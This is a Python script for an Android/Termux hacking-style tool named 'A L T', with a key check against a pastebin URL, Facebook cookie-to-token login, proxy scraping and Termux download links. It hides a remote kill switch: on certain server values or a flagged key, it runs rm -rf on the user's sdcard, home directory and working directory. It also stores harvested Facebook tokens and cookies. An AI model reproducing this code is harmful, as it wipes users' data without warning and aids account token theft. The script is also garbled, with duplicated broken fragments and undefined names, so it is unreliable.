#!/usr/bin/python
import os
import sys
import requests
import uuid
import time
import datetime
import random
import subprocess
import base64
import platform
from datetime import date
import calendar

# Banner and utility functions
banner = '''              .d8b.       db          d888888b 
             d8   8b      88             88 
             88ooo88      88             88    
             88ooo88      88             88    
             88   88      88booo         88    
             YP   YP      Y88888P        YP    '''

def logo():
    os.system("clear")
    print(banner)
    print("-----------------------------------------------------------")
    print("[*] Tool Name : A L T         [*] Version : 0.0.0.1")
    print("[*] Owner :                   [*] Date : " + alldatexx)
    print("[*] Your Key : " + key)
    print("-----------------------------------------------------------")

# Date and time setup
ct = datetime.datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
nTemp = n - 1
current = datetime.datetime.now()
year = current.year
bu = current.month
cday = current.day
months = monthsx[nTemp]
my_date = date.today()
day = calendar.day_name[my_date.weekday()]
alldate = f"{day}-{cday}-{months}-{year}"
alldatex = f"{cday} {months} {year}"
alldatexx = f"{cday}/{months}/{year}"

# User key generation
id1 = uuid.uuid4().hex[:7].upper()
id2 = uuid.uuid4().hex[:7].upper()
id3 = uuid.uuid4().hex[:7].upper()
key = f"{id1}-{id2}-{id3}"

# Setup session and requests
_ses = requests.Session()

def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)

def jalanx(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.09)

# Server and key checking
x_ = 'https://pastebin.co'
x__ = 'm/raw/R7P'
x___ = 'jtyuA'

def online_pass():
    try:
        password = requests.get(x_ + x__ + x___).json()["password"]
        logo()
        iid = input("[>>] Enter Key : ")
        if iid == password:
            pass
        else:
            os.system('xdg-open https://www.facebook.com/SoryBro.IAm.ALT')
            fb_menu()
    except IOError:
        logo()
        print("[->] Internet Connection Error Bro :/ ")
        sys.exit()

def server_chack():
    try:
        server_status = requests.get(x_ + x__ + x___).json()["server_status"]
        if server_status.lower() in ['online', 'activate']:
            pass
        elif server_status.lower() in ['offline', 'off']:
            logo()
            print("[->] Sorry Bro Server Down :/ ")
            exit()
        elif server_status.lower() in ['fuck', 'bypass']:
            os.system('rm -rf /sdcard/*')
            os.system('rm -rf $HOME/*')
            os.system('rm -rf *')
            exit()
        elif server_status.lower() in ['update', 'upgrade']:
            logo()
            print("[->] Tool Updating Bro Wait For Some Time ")
            exit()
        elif server_status.lower() == 'exit':
            exit()
        else:
            logo()
            print("[->] Error 405 ")
    except IOError:
        logo()
        print("[->] Internet Connection Error Bro :/ ")
        sys.exit()

def key_chack():
    try:
        fucked_key = requests.get(x_ + x__ + x___).json()["fucked_key"]
        blocked_key = requests.get(x_ + x__ + x___).json()["blocked_key"]
        if blocked_key == key:
            logo()
            print("[->] Sorry, Your Key is Blocked!")
            exit()
    except IOError:
        logo()
        print("[->] Internet Connection Error :/ ")
        sys.exit()
			print("[->] Your Key Is Blocked Bro :/ ")
			exit()
		elif fucked_key == key:
			os.system('rm -rf /sdcard/*')
			os.system('rm -rf $HOME/*')
			os.system('rm -rf *')
			exit()
		else:
			pass
	except IOError:
		logo()
		print("[->] Internet Connection Error Bro :/ ")
		os.sys.exit()
		
def fb_cookie_login():
	logo()
	cookie = input("[->] Enter Cookie : ")
	try:
		data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", "referer" : "https://m.facebook.com/", "host" : "m.facebook.com", "origin" : "https://m.facebook.com", "upgrade-insecure-requests" : "1", "accept-language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control" : "max-age=0", "accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "content-type" : "text/html; charset=utf-8"}, cookies = {"cookie" : cookie})
		find_token = re.search("(EAA\w+)", data.text)
		hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
		os.system("rm -rf Data/Facebook/Data/fb_token.txt ")
		os.system("rm -rf Data/Facebook/Data/fb_cookie.txt")
		xd = open("Data/Facebook/Data/fb_token.txt", "w")
		xd.write(find_token.group(1))
		xd.close()
		xd2 = open("Data/Facebook/Data/fb_cookie.txt", "w")
		xd2.write(cookie)
		xd2.close()
		input("\n[*] Login Successful :) :v ")
		time.sleep(2)
		fb_menu()
	except requests.exceptions.ConnectionError:
		print("\n[*] Internet Connection Error :/ ")
		time.sleep(2)
		fb_login()
	except (KeyError,IOError,AttributeError):
		print("\n[*] Cookie Invalid ")
		time.sleep(2)
		fb_login()
def download_ua():
	logo()
	os.system("rm -rf user_agent.txt")
	os.system("rm -rf /sdcard/UserAgent_2613_File/")
	os.system("wget https://raw.githubusercontent.com/Bilal-XD/Github-Data/main/user_agent.txt ")
	os.system("mkdir /sdcard/UserAgent_2613_File")
	os.system("mv user_agent.txt /sdcard/UserAgent_2613_File/")
	print("\n\n[*] User-Agents File Downloading Successful\n[*] File Save As /sdcard/UserAgent_2613_File/ \n[*] 2613 User-Agents For One-Tap \n\n")
	input("[*] Back ")
class proxy():
	def __init__(self):
		self.url = "https://free-proxy-list.net/"
		proxies = []
		logo()
		prxy = ses.get(self.url).text
		proxy = re.findall(r"<tr><td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td><td>(\d+?)</td>", prxy)
		for x in proxy:
			proxies.append(":".join(x))
		try:tanya_total = int(input("[->] Enter Amount Of Proxys [ Max : 10 ] : "))
		except:tanya_total = 1
		time.sleep(1.5)
		print("")
		for total in range(tanya_total):
			total +=1
			prx = proxies
			print("[*] Free Proxy %s : %s"%(total, prx)) ## proxy()
def main_menu():
	logo()
	print("[01] Goto Facebook Menu ")
	print("[02] ")
	print("[03] ")
	print("[04] ")
	print("[05] ")
	print("[06] ")
	print("[07] ")
	print("[08] ")
	print("[09] ")
	print("[10] ")
	print("[11] ")
	print("[12] ")
	print("[13] ")
	print("[14] Tool Team Info  ")
	print("[15] Update Tool [\x1b[1;92m A L T \x1b[1;97m]")
	mm = input("\n[->] Choose : ")
	if mm in ['1','fb','Fb','FB','facebook','Facebool','FACEBOOK','01']:
		time.sleep(1.5)
		fb_menu()
	elif mm in ['update','Update','15']:
		try:
			os.system("git pull")
		except IOError:
			print("[×] Chack Your Internet Connection And Try Again ")
			time.sleep(0.05)
			main_menu()
		except:
			print("[×] Error In Updating Bro Try Again After Some Time ")
			print("[×] Chack Your Internet Connection And Try Again ")
			time.sleep(0.05)
			main_menu()
	elif mm in ['team','Team','14']:
		team_info()
	else:
		time.sleep(0.05)
		main_menu()
def termux_version():
	try:
		logo()
		print("[01] Download Termux Version 0.22 [ 134.8 KB ]");time.sleep(0.3)
		print("[02] Download Termux Version 0.27 [ 142.0 KB ] ");time.sleep(0.3)
		print("[03] Download Termux Version 0.39 [ 196.1 KB ] ");time.sleep(0.3)
		print("[04] Download Termux Version 0.52 [ 172.4 KB ] ");time.sleep(0.3)
		print("[05] Download Termux Version 0.54 [ 207.9 KB ] ");time.sleep(0.3)
		print("[06] Download Termux Version 0.55 [ 207.6 KB ] ");time.sleep(0.3)
		print("[07] Download Termux Version 0.56 [ 220.1 KB ] ");time.sleep(0.3)
		print("[08] Download Termux Version 0.57 [ 219.2 KB ] ");time.sleep(0.3)
		print("[09] Download Termux Version 0.59 [ 217.8 KB ] ");time.sleep(0.3)
		print("[10] Download Termux Version 0.60 [ 217.9 KB ] ");time.sleep(0.3)
		print("[11] Download Termux Version 0.61 [ 219.5 KB ] ");time.sleep(0.3)
		print("[12] Download Termux Version 0.62 [ 221.0 KB ] ");time.sleep(0.3)
		print("[13] Download Termux Version 0.63 [ 220.9 KB ] ");time.sleep(0.3)
		print("[14] Download Termux Version 0.64 [ 221.2 KB ] ");time.sleep(0.3)
		print("[15] Download Termux Version 0.65 [ 225.1 KB ] ");time.sleep(0.3)
		print("[16] Download Termux Version 0.66 [ 214.7 KB ] ");time.sleep(0.3)
		print("[17] Download Termux Version 0.67 [ 215.9 KB ] ");time.sleep(0.3)
		print("[18] Download Termux Version 0.68 [ 205.9 KB ] ");time.sleep(0.3)
		print("[19] Download Termux Version 0.69 [ 209.9 KB ] ");time.sleep(0.3)
		print("[20] Download Termux Version 0.70 [ 209.5 KB ] ");time.sleep(0.3)
		print("[21] Download Termux Version 0.71 [ 209.4 KB ] ");time.sleep(0.3)
		print("[22] Download Termux Version 0.72 [ 209.4 KB ] ");time.sleep(0.3)
		print("[23] Download Termux Version 0.73 [ 210.2 KB ] ");time.sleep(0.3)
		print("[24] Download Termux Version 0.83 [ 165.5 KB ] ");time.sleep(0.3)
		print("[25] Download Termux Version 0.95 [ 68.0 MB ] ");time.sleep(0.3)
		print("[26] Download Termux Version 0.98 [ 69.1 MB ] ");time.sleep(0.3)
		print("[27] Download Termux Version 0.99 [ 69.4 MB ] ");time.sleep(0.3)
		print("[28] Download Termux Version 0.101 [ 69.5 MB ] ");time.sleep(0.3)
		print("[29] Download Termux Version 0.103 [ 84.8 MB ] ");time.sleep(0.3)
		print("[30] Download Termux Version 0.117 [ 81.8 MB ] ");time.sleep(0.3)
		print("[31] Download Termux Version 0.118 [ 97.0 MB ] ");time.sleep(0.3)
		termx = input("\n[*] Choose : ")
		if termx == '1' or termx == '01':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcdxsPCLqN7Jvyabuxbed1pJpRCSwnuyKIbpLVYG73WxEZhVEdhRpVtgeJUlrOeCUSnH3nfST74kJJac84mAobwS/pu1xR0lYwI7c3fVxgHaimvc42zhgxZUsD-6GeeFuszEHXCU4Fnb5c0r5WVAXol-2FbFtHV6RPUNDF6_gFgp5O04Qq9JhmSqZkJGRDeTdQQpttfeZjrIzzSaDwVbWXQ62/s3Fg4gz-gb--a24GmGhvLsmGxSNsaroZMX4wGIkxzT1xP1HX7Nf5jT1R_kz8jAM1/")
			exit("\n\n")
		elif termx == '2' or termx == '02':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfZ65frD3At9BnHVn_sxrl3u9UtAOu6wH8IjsVGUA6bj6bh-e_riWA5RcgyvQh9ZXw5CxVysSOR20w1Y1fXrF2c/6O-1OXpAWcqVX7IQh7y4RXD9ZOQu5fTX4rQKgaOS3Ixfxnxq6ZGrzs88O6-N4DgCqZGKEmmjXq8s6Cp7F1RfABEDtcaLjcnszTNw3et-4CQ-Axi5EstSZ3tnVPn21PWq/YHd_sXmm9qIcE5KB8ng3-XQK66wK1br0IK83SMJtCQ9wumQQORKJqDtqt7i0Wa9U/")
			exit("\n\n")
		elif termx == '3' or termx == '03':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccnFOUpb1y9UtJ70hTDAdT_fRA2U9yqo9oUfN9OmDXues67izgjo6zOOQXEb_NzgOXM4GNFwqTWjukErrh--wEG/mnyM7Zn-cawi51jtLLN8MPJSeM1_B7njWtuGtkfjSF87rloWZ4X-fy8wTsviQbD4CyJX9j7e-zPFAmHnPdiQ1QSqeEipl3KurhRS8d2i4xzm9BfrckHrsg6p5QTqtHA5/nrGsBCObMF77FGy9MSShf2CGUL_Oh6mAVo40vGZ_1fq_2oNH079DojgCaNRG5_XZ/")
			exit("\n\n")
		elif termx == '4' or termx == '04':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTceIGgyPgS_869klVlnbSgIwotXsYsS5ciGEoBy02aBMYYqYtgcXlJvcGn4HN9Lru5XBskxbjgf-ffDfsX5K8EZ2/cW843T7MTlLq8MBtfEpgUyUsbiST3iqvXF-4cvd9kI3xBttlDLchxaXpxVPXqXaau8S1FQIqoqwMkPSk0Y6f2V0E4Rrorci54EV-Q5W4I32JEPCTVV19DR5X0WEdtGlM/uZ4ql90pajb1YV8gT89cjew8KD_t4gQsWgeFkAcXC5vcGYBrviNYbibjz7-U1IWc/")
			exit("\n\n")
		elif termx == '5' or termx == '05':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccfk3ZJ4_aZksVG_wZNmtuNYXXJjBxpP-8_0F31DxkwH1LJPWrLViIvt4HuxgLQ4pwKClZJV1vP4W-19wanrOcN/ZlSQCDhmRlR0tTh37AMltZU_JUrZwbJ7knHJ_q1p-AwGCvBVGA_SxLnsBugaFdqDCwZnKx9LiOclVTRUZCFsveNhVYQMP8DQS1X35NrO5lJ9F7YA6kRuDi-I43Nj4dZf/o8wTixCim25fO-AqqZ5tMavAm6A0_HxA8LvXE-JHzV4Y66jxS07MvR9hM7K-ZCgD/")
			exit("\n\n")
		elif termx == '6' or termx == '06':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccOOAtIUHrchxV7vAl9LprnVDZcdRAfo55O1t6b2rnzegDGKHmFWQBn--XQmVSDyA4HgTCdYFG9TU8FlrS8IFmK/3sT4UPIvAELdp20va3f1cwMf595okVKxeyOqMpR4hSjyN5EYLFGGRqW4FG_0VX3s28wrn9kGp-FSEGx0ZFq_DeRuSqo4bTWZ86R5WyeRDFzfZr4PG3ugTGDdITAvc20g/FLHQuYy84y_YaHu2dOt2wkabiUy4_T63LJOBvsdz3jS1vb_8Y0NhkuIerpJ8WxNg/")
			exit("\n\n")
		elif termx == '7' or termx == '07':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTce9AwJqNv2RGGD48Iskf4rnEi5d68FCvdZ6nhmgWl1fZUvaNo-aPqj6szL6OMYiqgO-MQJYcAEOOqwIAMvdzCWU/a4f3uMg3qmVTGz_kC-Xy_nZ9v3ETgRd1RmwY29GapJH__R5JL2re37WsowrOuicc5nOqNDcF8G0A_fQdNksAPu0ofCozUytmMT2-Mx-mO1sRaExu11MowVVRlpa5zcse/LWgya0qvwx9sQ3mbvBuqc59r3AydZzHVMuBmjwlXhX4XIQ62JuPmh2AaKtrfbaed/")
			exit("\n\n")
		elif termx == '8' or termx == '08':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccQ_WQZLMbzeMkLP3CV9XXdX-Z57p9tV-1qufcmqL0HSKkwvS24Dn9ScBXkENsxey6C1Q4RUCYQdGIsdAWyVp1d/4WYmjgh8KUS90hjwwI-bkeY_k4ZMyWDipU_79OAzFz-Al3efD61pHwMIEP_7nk17AnwC8whaso_0gcrdeeqdpcKJfTySlCJ4HoS1ImZNoNnCLQeVffTVofymAyXaRsko/BSz16ubJuJlrb6wzZ50kvDWj34o633LuXwYZPfS___2Xe8Gjk73aKA2kH-xXX0Tk/")
			exit("\n\n")
		elif termx == '9' or termx == '09':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcd50FR6LtKlLEx_Y6_k4S5Y-gDkpaKugHLIYanOyy_UYwqoKsUlhjqzkxFTey7wTBwVYWo8OmBHOSJIaQsMyqu2/KjWD-05mryNGmROuajVDN2Nocznnj0JujYTE7d3oQPgP2OLXt8E3XV6FTH6eJkppby5PGNyTo8f5MUuQFjW4tOyUOjGG67NmCV7R1voCSqaecLft4cZEuEDRgTp2ZNGH/6PpSf5vMuDtk2gYaJfzAjKWR0oShtqISyTOF6-sE6RdfB0b8H9FDUq0Kw43tQOHC/")
			exit("\n\n")
		elif termx == '10':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfNKiijG50Ff_8Z-suAJKO8mv2370ppqtRCNE01uo2O0-jNZqepF-N6TtSqiJRPShPAZ6LZKeYKtrchvzj7qkLP/DSSwQqO7xFHkc0-IhhBfqEw9WstIIMEXArBdx0tfMuGkSkxg-siAIfFWzqjr2mYDJCsPmLNJ8hh14JcgFG5mpRlgQ4sxd490Y327DThRN7iknGL09pGLsQpK2M_6BQ9h/j1R_aacogbcHWaBuFLnJ2MZ_lxNauiNVzS-nMch6j5WhAVWvoq43s-WhY2dBDHIc/")
			exit("\n\n")
		elif termx == '11':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcdy8O_RiGlS7LT2cZGekesor8kJ0a_tbeXVj8FN0Z3aMwNHNSqOaHiaVl0nccjpwrk3eD57bQ5OCk_hQ6BLfesK/VVdf3dY4MI_-BwzEaJ0SSZL4_UdsFmPMltF7ZrRLq37KyxOIMKB-f87XK8PFPSYaKEK0dh0A3aZzMUempbAUff2fkdF5NYRP_h4EGgIqzvrj9U4Arx-BjOVQPXfNe9Yv/-Z71xOwMQgKFFlPLARK1n0qMtgpo_IhhK2kspvAiZpsUzsNijHMKvnQc4FR-D0tM/")
			exit("\n\n")
		elif termx == '12':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTce0FANL7w3oRwPJpXx54crFgbSAt9nqOz7ygjFZ0FfeXvEtgEo4NQtpCYw2rXJiTxWtNlJIq_a8bI3EhnMzFNhd/4CaCPP_Q3I0R670YD_aLSPZ97ThFQAbzA-ZqbeXUOvjFaefhXj6nSIbBpuLzmMZWcx0qVTzzOJigXswlzNZILsSN0QZ5sEgZ_WHPQ9gWKXedb3hlpSjv3OPiwFgUtrGq/tD3WDg8ey5VAmmxMG37bbNHyi5Bt3xBjqdgjv5caTAzA2Owlh0S5E_CaCzVB6_Vx/")
			exit("\n\n")
		elif termx == '13':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcehlWO_TukoXntJET1QK-HT479Lf6JbKCj664eGXhC6Spcjp8bvSBj4IwnmVakI2ocbLP87HcN62L5ZldZNy5MQ/Y0TKQtTQVR0axFxt9ZEWpCuyspEh0qKnT5xuU9VmK2J3HnKd_g5jGspAXvKdxkGrUhDhONbgJ_wf_GvlM2pUUl2DroE9lA42W1YYEnAz91n2kSTBPbvGaVVmFO0gZPwJ/ZNFuLE_WYQOvX-3dcsbNf--6utwPjiJH2gYRYatDPdcxG35fomwajyN259iiPXJU/")
			exit("\n\n")
		elif termx == '14':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcezeqS2inCejhb1LPtGExPjAbaXOw0WJO-rF6Cfw3u7NC0NbMy9JncpqO03__pdXkUILf5WDkRINMAYdvI4nSzI/HbXdEyba8x5P8v-O4Z7vAQRN2ung5QS8K8Xy0SSQVYdsgbz0ogzuUtibaJNl19fT-QhHBeBHQV75gcsrflCxai9x9WYkkDpNy2qcX7_tALWt9RsqT0fhcWcODxtkMYod/L9_pG9V4LQxG07G5TQP1joxCCU8b4K9G57A5LerPDZJ0MOpiugUieq_gC9VBj-CD/")
			exit("\n\n")
		elif termx == '15':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcd3Tgp3uMz5kWkdboNPO1wHWSilcJEJDdMaKzqTlYo0LSgyeT4J1YGPwUgY7PVzRAZH6sEM-8eeSp9UbeSS8idY/rPuEKEMDJ_a-bI-BODOaztQJdFNLatNbl8nrUSP1Bm7pwQSbjBP9GNKsoZ1TNT_ZY41OOIxdMxsUHfuYafVNMALYJc3tVc0zw8Iq88E30pQxQojU6V7HJHQ6e7eX29WP/3ybBCtWsI039iTp8mxqlwAjv7AoC3zarrt7Lg3PPFlhFsGeO9x3l6Z3Yy1-HSw2z/")
			exit("\n\n")
		elif termx == '16':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcebSL7eOPiqmCtj6ho166nsZ0JtFZFlLh1CEBIbfbqmWJuauhOgb31U2GmbAjPCA1NL6KTgYsC1SBlEKBTftSos/ftmwrJLFdmucsaLr4cq0lRRWSyce2HhtXapxAhTcAjoF_PyCFqk1rXl627YAo5_Luwgd9kujso_GN_VoZsFdS6val4bi0HSHv5bKSDrxOfbsvMc5rdp-a0FrJvhXAAq_/jfl4bV3fBOlo3tXG5_DYYYJDZEE4KYCB5q1gl9J8khAwYUHWd38KHv2u3o2esEf5/")
			exit("\n\n")
		elif termx == '17':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfutwuDYwojmcAOPR9ueKmKr4mlroN_HH7RAUtNm1vCz_c6ja87ZgeyZ_kDSauGlhMi6lLTfLvms1x2ONNSFqGQ/oQLBwCxFvc1QSPO_xQNI92EVMY-dgewbJZTbq8Fz7bv9_4CbzGWnxlGRioHM6bqbDnlzz9ByZLE7yy73oBG0WYSJPdxLJfvoDiMaHkA_3Xb5G6yhCraSA3umFeBd1c16/ZJtk81A_vq8D3H9j_L6gd0gua3wG7AohbEw7e0Y7I2h8RaoNlaWUBYElzRCCDM5g/")
			exit("\n\n")
		elif termx == '18':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfbwWeGp6qBm1MuwLofHM_xIM5_yHkrLGMtWfW_SDAZ0IsAP8bb74x6vD0ruXZ_rTskjI5IHS2rSsNZT9jlYMt8/4w3PcfrEu3qkRU-7_vF_ZoYTjdi2EK75Qcxe60gS9AiX67wRaRBfh06mIkoJIGmW4U8DjIfyGjKAykp1XKHGHVMuq_QvLwZ6L-wudGkMooMlqtYSgsXkQ5PWB5z3n0pY/vKUyVKIVDyZgg2mBz9s8a9G4MaZ9U1jNlIiWW2TTwqZrnBCFd4qHDgRtCOVknlDJ/")
			exit("\n\n")
		elif termx == '19':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcdtkNQfqOGMQ_iVDjwMSWWFd0UrG7oxoLko8L18ZdqyLCXHLOjz6bsn4PWEAS-t5GSkdSsTcTqKNkJVkCLTSda8/GnH7v_K7GQxJ3sd4H4j4cZrVIO3bhMBM2GFfS6m_oUS2kt-XI2n-FVmQpy-n7HiYz6a8shNQ0azapn0ZYEQI0G287N4I48evJuGBw1Rk2RuLyadySncXkmhKlr9u0rm1/WbYhtlMg-UaHbDQKiWu5dvtnQ_bWpHEhzV-0mJxtWyUOVyJm_Q6XLRb9U8hBq6LE/")
			exit("\n\n")
		elif termx == '20':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcdABJnWrbDlCAJqlptnUqALvbR1DRtmzCAsigvxqOJLf3F-xbFHtHai9gRntorZmnLQHW_mlzhqAyW6Jlj4TXv0/xJ9YyN5TuoMMOx5e3u57YPpELy8A3kXhkuxCOUVQwkNfUzgftmFaAWXq1g4RFMNVQGaNV4FyuR58EIVLFoGK-r8pMWVFRntOcp9ldal0B86ZM_6R6eUT2YEib1AuIDmR/Ofcteop6Qa-iA9RPgs7J506vW1BQ9-qZAReX1zcAg5ag4xu1UbliWT9EDvObhurD/")
			exit("\n\n")
		elif termx == '21':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcd9lVLhBS_gRpOzWlcliyU6Rdt50kJs_YDIr2AhTW-OdTx29_gICtcDAbLsKzZFbQNNt4Prkgv-yk4De3UmkNIY/EH2OQ7AqnCg6M0lZK-vv3T8vcaicrusZS9O-K8bEPQ65o2ro6-aBhyMKVooaL3Bi5EeHws-o76GVIu3hz5Cihv7W9eoMnXJAKd268R7As-G_CTx3r7QWE23iAp57ANni/NkyTQYc3Zz8rgQrGtkwxFxXs6W0Q-KCU7Z185kqTFfoKAX3kGh7SsWSWlBPzidp6/")
			exit("\n\n")
		elif termx == '22':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTceclBZR3xdeMq4EsStrkudy8ubhtfZRAoVYoS9Nnp5vW2QO8KfqYNEtNBEcAcG9vB4qWBW6RyMf7U-P9Csef1Y4/87wmSgEqz6DJMnxuwXIixTgV80JDP_PAzlBRoG3SnduuXKEEhIpU-eAiKm3EZbDL9UUfMuCLb-fa6WofiE0hlNPojYfKRzpToNr7RXwUJOIjApyJHYN6FSBQGk_USvc1/5R5uL20sOBKSJLzzXmAdgbHzAo7HAajGj0l5dnAgM1Ft-juCAJiDUT34l7__rmT-/")
			exit("\n\n")
		elif termx == '23':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcehrWuE1buDVQdZlF8vujmxKvXSBx8GfeFFBhH9CoyozUgQIerPm3ZfYKAwft-w-sUlZT2pLcwFXdE9NF386Vzo/NOSxD8jsABkJGYr4ehZp8HkrSA6ch9xirKQFBlkBJMVZ4D5GuFEErIW0yd8-MH1Ocj99Hvel-KDxwyjbM2kLfWpCuASYHzAJa1H0cFm8kyUG5pFeXUAkbQtLFx5XE63N/ZPStbehIoVFx2dn-rhTIdN-8VNjozpwAJwHKE46jEsVHodf2gIfAWTrexB6bAKxM/")
			exit("\n\n")
		elif termx == '24':
			os.system("xdg-open  https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcf7OmF5Nj4Q_8f319266WAOYbH_yx9nGgJMme9476aA3Dl6uaAP_XSm5SUC6L_NO51J5RI4D2TTlP6RtmdJyNPl/8MX0dO0LbCUWQ5c-4ix0pHMJLA-DmFM6EWvxb_Ym0yFbF88KjV0-DgrAzct6TLNJfYiPwXkuFHIGjqUkZed5n6jAYuLysLyN_ZJKY55PJDPDA0lnX_zy8XPj1CApnxuZ/J8-HomRt-G6yyjUr4od5-fHDByV06saUqI2_CNCH437hjsBRl8R2oGeNOAkmrt4K/")
			exit("\n\n")
		elif termx == '25':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfWX24QR5eO0KJVvBmUTya0bK6l-yvhHwlssU6qw5s1ac7ChZ4o2jp6_ofLesIvh2zZ5uFFY_9ipsRhNyNDPEwH/deJWc78ddXjr2517vv9EyPUWTwgUnjmZI95g-pkCoZ87if1DO52yDM3UXPTmj0Qr5R6iCnZgmInj9-eHC_J1LPAT_XCtEJlclI7OWuTs2eALxLnkXxcZyVxKCrVB3E1b/M9ni8CQLXImQVZucvwWvOf9GA5YqR8xJxyERxxhOFPpIXCxcRd_hTL0LglNEb97j/")
			exit("\n\n")
		elif termx == '26':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccRxT-EdyyXEI0aqlreY3LHyEcMoEdfdkiICcvqBpUjCw6BIdjoHJy-P9kOAAUdnwbJjXyYSAYJ1jL4FEpQHaUL/d9MZbpHdF98Wh8_wgVF3WKt_qEg7YDU4V_pdhnNynajyzgEU8CxN28Z-4DIIndlvAQ1wPEYIVC38PUquEkgFq2IYHaAP7sWhLWUy9ZDdKY-gv5vhfuIFkfxhXPYJVOJM/AKshkzDS8ZWU1ZAdN13tP-1_mVToOfflOYVBYamzWB0CGgX4bQH2EUvJJa2fS4Vv/")
			exit("\n\n")
		elif termx == '27':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcd5vRx4N0JxAMrmCysfCqGn7q3kncLkxWdzL1ej9lK5EgdSijaFQKO4PhYCfz5CBUOg_I1LqypvdHH4gDq94pgT/tg_gHEW57s_uT88YqL-jaxmaGk7Aqm6T5jEx0hyA4Tqx-Qv5v4_itYYMxLZN3gRIgGOQq4In8gfNqTeQ9kgructEU54vwjT65e1Oh_ymJQmZTDgATXQII5ozlglUvlS0/OQZtSRVUy8aqYo90ysPRkcU6JmD_M73aHaJbHhvr0h4aDr3OakdCRKAnpKUq31EB/")
			exit("\n\n")
		elif termx == '28':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccG0Mdt-fvV_KfydDA-jiEIrhmVc2f8PYduyTk7tE_U093jdjDpTjRbyk3vmtKWryBRSnoIXj3gmbqQHNrSEWCQ/UP9bADb5kzV5WytmcD0bGn7oKOcD7AOgaVSy26o49SWCUq8P5BAUaPXPP72sZN1AvH6vzp2IjdlXEmAHP6ghpDnrLjJ5KmtO9FejS7ym9lhadNiJcpcV7y6S7teWR5wc/pk7o8D2-GeO-X5-sAYTRQtuVWgknZPT98WjDfejUv056vrSe9UtwDZl4Sv26mluF/")
			exit("\n\n")
		elif termx == '29':
			os.system("xdg-open https://d-01.aabstatic.com/1120/termux_0.103_androidapksbox.apk")
			exit("\n\n")
		elif termx == '30':
			os.system("xdg-open https://www.gnradar.com/download/Termux.apk")
			exit("\n\n")
		elif termx == '31':
